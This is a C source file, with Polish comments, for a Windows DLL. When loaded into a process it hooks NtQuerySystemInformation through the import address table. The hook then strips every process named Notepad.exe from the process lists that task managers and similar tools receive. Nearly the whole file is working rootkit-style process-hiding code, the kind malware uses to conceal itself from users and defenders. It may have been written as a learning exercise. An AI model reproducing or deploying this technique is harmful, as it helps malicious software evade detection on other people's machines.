#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>
#include <sysinfoapi.h>


typedef struct _SYSTEM_THREADS {
	LARGE_INTEGER  KernelTime;
	LARGE_INTEGER  UserTime;
	LARGE_INTEGER  CreateTime;
	ULONG          WaitTime;
	PVOID          StartAddress;
	CLIENT_ID      ClientId;
	KPRIORITY      Priority;
	KPRIORITY      BasePriority;
	ULONG          ContextSwitchCount;
	LONG           State;
	LONG           WaitReason;
} SYSTEM_THREADS, * PSYSTEM_THREADS;

typedef NTSTATUS(WINAPI* tNTQSI)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);


typedef struct _VM_COUNTERS {
#ifdef _WIN64
	SIZE_T         PeakVirtualSize;
	SIZE_T         PageFaultCount;
	SIZE_T         PeakWorkingSetSize;
	SIZE_T         WorkingSetSize;
	SIZE_T         QuotaPeakPagedPoolUsage;
	SIZE_T         QuotaPagedPoolUsage;
	SIZE_T         QuotaPeakNonPagedPoolUsage;
	SIZE_T         QuotaNonPagedPoolUsage;
	SIZE_T         PagefileUsage;
	SIZE_T         PeakPagefileUsage;
	SIZE_T         VirtualSize;
#else
	SIZE_T         PeakVirtualSize;
	SIZE_T         VirtualSize;
	ULONG          PageFaultCount;
	SIZE_T         PeakWorkingSetSize;
	SIZE_T         WorkingSetSize;
	SIZE_T         QuotaPeakPagedPoolUsage;
	SIZE_T         QuotaPagedPoolUsage;
	SIZE_T         QuotaPeakNonPagedPoolUsage;
	SIZE_T         QuotaNonPagedPoolUsage;
	SIZE_T         PagefileUsage;
	SIZE_T         PeakPagefileUsage;
#endif
} VM_COUNTERS;

typedef struct _SYSTEM_PROCESSES {
	ULONG            NextEntryDelta;
	ULONG            ThreadCount;
	ULONG            Reserved1[6];
	LARGE_INTEGER   CreateTime;
	LARGE_INTEGER   UserTime;
	LARGE_INTEGER   KernelTime;
	UNICODE_STRING  ProcessName;
	KPRIORITY        BasePriority;
	ULONG            ProcessId;
	ULONG            InheritedFromProcessId;
	ULONG            HandleCount;
	ULONG            Reserved2[2];
	VM_COUNTERS        VmCounters;
#if _WIN32_WINNT >= 0x500
	IO_COUNTERS        IoCounters;
#endif
	SYSTEM_THREADS  Threads[1];
} SYSTEM_PROCESSES, * PSYSTEM_PROCESSES;

tNTQSI originalQSI = (tNTQSI)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation");

NTSTATUS WINAPI HookedNtQuerySystemInformation(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
) {
	NTSTATUS status = originalQSI(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	
	if (SystemProcessInformation == SystemInformationClass && NT_SUCCESS(status)) {
		PSYSTEM_PROCESSES curr = NULL;
		PSYSTEM_PROCESSES next = (PSYSTEM_PROCESSES)SystemInformation;

		do {
			curr = next;
			next = (PSYSTEM_PROCESSES)(((LPBYTE)curr) + curr->NextEntryDelta);

			if (!wcsncmp(next->ProcessName.Buffer, L"Notepad.exe", next->ProcessName.Length)) {
				if (!next->NextEntryDelta) {
					curr->NextEntryDelta = 0;
				}
				else {
					curr->NextEntryDelta += next->NextEntryDelta;
				}
			}
		} while (curr->NextEntryDelta != 0);
		
	}

	return status;
}

void StartHook() {
	//Pobranie uchwytu modulu, czyli bazowego adresu pliku .exe, a nastepnie pobranie informacji o module
	MODULEINFO modInfo = { 0 };
	HMODULE hModule = GetModuleHandle(0);
	GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));

	// PE HEADER
	LPBYTE pAddress = (LPBYTE)modInfo.lpBaseOfDll; //Wskaznik na poczatek naszego modulu
	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pAddress; //Wskaznik na DOS Header, czyli poczatek definicji modulu

	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(pAddress + pIDH->e_lfanew); //OFFSET WSKAZUJE NA NT_HEADER

	//Referencja ImageOptionalHeader - przechowuje informacje o pliku wykonywalnym
	PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER) & (pINH->OptionalHeader);

	//IMAGE IMPORT DESCRIPTIOR - informacje o funkcjach używanych przez proces
	PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAddress + pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	// Szukamy wsrod zaimportowanych bibliotek ntdll.dll, pIID->Characteristics sprawdza NULL
	for (; pIID->Characteristics; pIID++) {
		if (!strcmp("ntdll.dll", (char*)(pAddress + pIID->Name))) {
			break;
		}
	}

	// Kazdy PIMAGE_IMPORT_DESCRIPTOR posiada dwie tablice ktore praktycznie wskazuja na to samo.
	PIMAGE_THUNK_DATA pITD = (PIMAGE_THUNK_DATA)(pAddress + pIID->OriginalFirstThunk);
	PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)(pAddress + pIID->FirstThunk);
	PIMAGE_IMPORT_BY_NAME pIIBM;

	for (; !(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pITD->u1.AddressOfData; pITD++) {
		pIIBM = (PIMAGE_IMPORT_BY_NAME)(pAddress + pITD->u1.AddressOfData);
		if (!strcmp("NtQuerySystemInformation", (char*)(pIIBM->Name))) {
			break;
		}

		pFirstThunkTest++;
	}

	//Uprawnienia
	DWORD dwOld = NULL;
	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
	pFirstThunkTest->u1.Function = (DWORD_PTR)HookedNtQuerySystemInformation;
	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);

	CloseHandle(hModule);
}

BOOL WINAPI DllMain(HINSTANCE hIstance,
	DWORD dwReason,
	LPVOID lpReserved)
{
	switch (dwReason) {
		case DLL_PROCESS_ATTACH:
			StartHook();
			break;
		case DLL_PROCESS_DETACH:
			MessageBoxA(0, "DETACH", "DETACH detach", 0);
			break;
	}
	return TRUE;
}